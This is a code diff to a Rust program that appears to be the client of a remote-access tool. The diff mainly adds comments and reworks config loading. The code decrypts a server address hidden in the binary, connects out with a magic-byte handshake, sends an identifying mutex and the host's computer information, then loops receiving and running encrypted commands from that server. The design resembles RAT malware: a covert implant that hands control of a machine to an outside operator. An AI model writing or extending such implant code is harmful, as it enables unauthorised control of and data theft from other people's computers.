@@ -41,16 +41,16 @@ pub fn wstring(s: &str) -> Vec<u16> {
 }
 
 /////////////////////////
-fn config() -> Result<Vec<u8>, Box<dyn std::error::Error>> {
+/*fn config() -> Result<Vec<u8>, Box<dyn std::error::Error>> {
     unsafe {
         std::ptr::read_volatile(_CONFIG_DATA.as_ptr()); // reads from _CONFIG_DATA
 
-        // Now read the length
+        // now read the length of the config
         let length_ptr = _CONFIG_DATA.as_ptr() as *const u32;
         let length = std::ptr::read_volatile(length_ptr).to_le() as usize;
 
-        if length == 0 || length > 4092 {
-            MessageBoxW(
+        if length == 0 || length > 4092 { // no config found, or bigger than expected (somehow)?
+            MessageBoxW( // show Windows MessageBox to user
                 null_mut(),
                 wstring("Failed to read config!").as_ptr(),
                 wstring("Error").as_ptr(),
@@ -60,86 +60,108 @@ fn config() -> Result<Vec<u8>, Box<dyn std::error::Error>> {
         }
         //////////////////////////////////////////////////
 
-        // STAGE 2: TRY TO READ THE CONFIG
-        let config_start = _CONFIG_DATA.as_ptr().add(4);
-        let mut config_trimmed = vec![0u8; length];
+        let config_start = _CONFIG_DATA.as_ptr().add(4); // config starts HERE, skip first 4 bytes (they are the length)
+        let mut config_trimmed = vec![0u8; length]; // new Vec holding the config data
         for i in 0..length {
-            config_trimmed[i] = std::ptr::read_volatile(config_start.add(i));
+            config_trimmed[i] = std::ptr::read_volatile(config_start.add(i)); // fill new Vec with bytes
         }
 
-        Ok(config_trimmed)
+        Ok(config_trimmed) // return the encrypted config data as bytes
     }
+}*/
+fn config() -> Result<Vec<u8>, Box<dyn std::error::Error>> {
+    let raw = &_CONFIG_DATA; // make pointer to the raw config data
+
+    // get first four bytes of the data, convert into rust number.
+    let length = u32::from_le_bytes(raw[0..4].try_into()?) as usize; // should be config length 
+    if length == 0 || length > 4092 { // check if the length is bigger than expected or doesn't exist
+        MessageBoxW( // show Windows MessageBox to user
+            std::ptr::null_mut(),
+            wstring("Failed to read config!").as_ptr(),
+            wstring("Error").as_ptr(),
+            MB_OKCANCEL | MB_ICONERROR,
+        );
+        return Err("Failed to read config!".into());
+    }
+
+    // return the encrypted config data as bytes, skip first 4 bytes (they are the length)
+    Ok(raw[4..4 + length].to_vec())
 }
 fn decrypt(
     config_trimmed: &Vec<u8>,
 ) -> Result<(ClientConfig, &GenericArray<u8, U32>), Box<dyn std::error::Error>> {
-    let key: &GenericArray<u8, U32> = Key::<Aes256Gcm>::from_slice(&config_trimmed[0..32]);
-    let nonce = Nonce::from_slice(&config_trimmed[32..44]);
-    let ciphertext = &config_trimmed[44..];
+    let key: &GenericArray<u8, U32> = Key::<Aes256Gcm>::from_slice(&config_trimmed[0..32]); // get key from bytes
+    let nonce = Nonce::from_slice(&config_trimmed[32..44]); // get nonce from bytes
+    let ciphertext = &config_trimmed[44..]; // encrypted config is the rest of the bytes
 
-    let cipher = Aes256Gcm::new(key);
+    let cipher = Aes256Gcm::new(key); // make cipher to decrypt the config, we will scaffold real encryption later on, no point yet
+                                      // because connection to server is not guaranteed
     let config = cipher
-        .decrypt(nonce, ciphertext)
+        .decrypt(nonce, ciphertext) // try to decrypt the config using the nonce and the cipher we just made
         .map_err(|e| e.to_string())
         .unwrap();
 
     let (client_config, _length): (ClientConfig, usize) =
-        bincode::decode_from_slice(&config, bincode::config::standard())?;
+        bincode::decode_from_slice(&config, bincode::config::standard())?; // convert bytes to struct using bincode
 
-    Ok((client_config, key))
+    Ok((client_config, key)) // return config and the key for encryption
 }
-
 /////////////////////////
-fn main() -> Result<(), Box<dyn std::error::Error>> {
-    let config_buffer = config()?;
-    let (config, _key) = decrypt(&config_buffer)?;
-    let socket = format!("{0}:{1}", &config.address, &config.port);
 
-    smol::block_on(async move {
-        let stream = TcpStream::connect(socket).await?;
+fn main() -> Result<(), Box<dyn std::error::Error>> {
+    let config_buffer = config()?; // load the key+nonce+config
+    let (config, _key) = decrypt(&config_buffer)?; // decrypt the config
+    let socket = format!("{0}:{1}", &config.address, &config.port); // string of server address
+
+    smol::block_on(async move { // enter an async scope to run async code
+        let stream = TcpStream::connect(socket).await?; // try to connect to the server
         let (mut reader, writer) = io::split(stream);
-        let writer = Arc::new(Mutex::new(writer));
+        let writer = Arc::new(Mutex::new(writer)); // wrapped in a mutex/arc so it can safely be shared between threads
+        // we must write to the stream from multiple threads because multiple commands can run at once. whereas we only read from the stream in one thread.
+        // the arc allows multiple pointers, cheap to clone, whereas the mutex (not to be confused with a client mutex) locks the writer so one thread can write to it at a time
 
         println!("[*][main] sending handshake");
         writer
             .lock()
             .await
-            .write_all(&[0x0a, 0xee, 0x7c, 0x9b, 0x32])
+            .write_all(&[0x0a, 0xee, 0x7c, 0x9b, 0x32]) // send magic packets to the server that identify us as a client
             .await?;
-        println!("[*][main] waiting for response");
+        println!("[*][main] waiting for response"); // if we're connecting to a server, it'll respond with its own magic packets
         let mut response = [0; 5];
         reader.read_exact(&mut response).await?;
 
-        if response == [0x32, 0x9b, 0x7c, 0xee, 0x0a] {
+        if response == [0x32, 0x9b, 0x7c, 0xee, 0x0a] { // the same byte sequence but reversed
             println!("[v][main] handshake successful; sending mutex");
             writer
                 .lock()
                 .await
-                .write_all(config.mutex.as_slice())
+                .write_all(config.mutex.as_slice()) // now we send our mutex to the server so it can authenticate us
+                //                                     it will be in the server whitelist if we are supposed to be connecting
                 .await?;
         } else {
             println!("[x][main] handshake failed");
             return Err("Failed handshake with server".into());
         }
 
-        let encryption = Encryption::new(_key);
+        let encryption = Encryption::new(_key); // remaking our encryption struct here because we're in a different scope from decrypting the config
+        // this one gets passed on because it's used to encrypt and decrypt our responses and server's commands.
 
-        if let Ok(res) = computer_info::main() {
-            let computer_info_payload = BaseResponse {
+        if let Ok(res) = computer_info::main() { // get our computer info. returns a result so is wrapped in an if Ok().
+            let computer_info_payload = BaseResponse { // this is the first response we will send to the server
                 id: 0,
-                response: res,
+                response: res, // data from the computer_info payload
             };
-            let _ = send(
-                &mut *writer.lock().await,
-                &encryption,
-                bincode::encode_to_vec(computer_info_payload, bincode::config::standard()).unwrap(),
+            let _ = send( // 'let _' ignores the result
+                &mut *writer.lock().await, // lock our tcpstream writer so we can send our 'response'
+                &encryption, // need to point to our encryption struct so the function can encrypt our response
+                bincode::encode_to_vec(computer_info_payload, bincode::config::standard()).unwrap(), // the data from the payload encoded w/ bincode
             )
             .await;
         } else {
             println!("[x][main] failed to run computer_info::main");
         }
 
-        match wait(reader, writer, encryption).await {
+        match wait(reader, writer, encryption).await { // enter a loop of receiving server commands
             Ok(_) => println!("[*][main] loop exited gracefully"),
             Err(e) => println!("[x][main] error waiting for response: {}", e),
         };
@@ -172,44 +194,53 @@ async fn wait(
 ) -> Result<(), std::io::Error> {
     println!("[*][wait] entered loop");
 
-    let (response_tx, response_rx) = channel::unbounded();
-    let mut active = ActiveCommands::new();
-    let encryption = Arc::new(encryption);
+    // this is the main loop that runs after connecting to the server
+    // wait for data -> decrypt -> handle command -> send response
 
-    let stream_writer = writer.clone();
-    let encryption_writer = encryption.clone();
+    // make a channel where one thread can send responses to another thread that will write them to the tcp stream.
+    // we need this because the thread that handles commands is not the same thread that reads from the server.
+    let (response_tx, response_rx) = channel::unbounded();
+
+    // most responsible for keeping track of commands that are still running
+    // gives us the ability to stop them if needed
+    let mut active = ActiveCommands::new();
+    let encryption = Arc::new(encryption); // shared pointer to the encryption object. only ever needs to be read, so no mutex.
+
+    let stream_writer = writer.clone(); // arc pointer, so cheap to clone. moves into new thread
+    let encryption_writer = encryption.clone(); // another arc pointer to encryption
     smol::spawn(async move {
-        while let Ok(response_data) = response_rx.recv().await {
+        while let Ok(response_data) = response_rx.recv().await { // response_rx is moved to a new thread here
+            // we use response_rx to anticipate the response of a command when it's completed running
             if let Err(e) = send(
-                &mut *stream_writer.lock().await,
-                &encryption_writer,
+                &mut *stream_writer.lock().await, // so is the writer clone
+                &encryption_writer, // so is the encryption clone...
                 response_data,
             )
             .await
             {
                 println!("[x][wait] failed to send response: {}", e);
-                break;
+                break; // error handling
             }
         }
     })
-    .detach();
+    .detach(); // allow it to run independently
 
-    loop {
-        match shared::net::read(&mut reader).await {
+    loop { // the main thread now falls into this loop
+        match shared::net::read(&mut reader).await { // where we wait for data over the tcp stream
             Ok(buf) => {
                 // println!("[*][wait] reading data from server");
-                let mut nonce = [0u8; 12];
-                nonce.copy_from_slice(&buf[..12]);
-                let buffer = &buf[12..];
-                if let Ok(decrypted) = encryption.decrypt(&nonce, buffer) {
-                    // println!("[v][wait] decrypted payload (size:{})", &decrypted.len());
-
+                let mut nonce = [0u8; 12]; // make space for nonce
+                nonce.copy_from_slice(&buf[..12]); // read nonce from the first 12 bytes of the data
+                let buffer = &buf[12..]; // the rest is encrypted data
+                if let Ok(decrypted) = encryption.decrypt(&nonce, buffer) { // decrypt using nonce+data
                     let (command, _size): (BaseCommand, usize) =
                         bincode::decode_from_slice(&decrypted, bincode::config::standard())
-                            .unwrap();
+                            .unwrap(); // decode to make it a struct using bincode
 
-                    let response_tx = response_tx.clone();
-                    active.spawn(command, response_tx).await;
+                    let response_tx = response_tx.clone(); // clone sender so we can move it into our new thread that handles the command
+                    active.spawn(command, response_tx).await; // spawn the command in the active commands handler, keeping track of it.
+                    // we pass through the response_tx variable because when the command sends its response through the channel when done
+                    // and 'tx' is connected to 'rx' since response_rx will receive this response and send it over tcp.
                 } else {
                     println!("[x][wait] decryption failed");
                 }
@@ -217,7 +248,7 @@ async fn wait(
             Err(e) => {
                 println!("[x][wait] {}", e);
                 if e.kind() != std::io::ErrorKind::FileTooLarge {
-                    break Ok(());
+                    break Ok(()); // we break if something goes wrong while listening for commands.
                 }
             }
         };
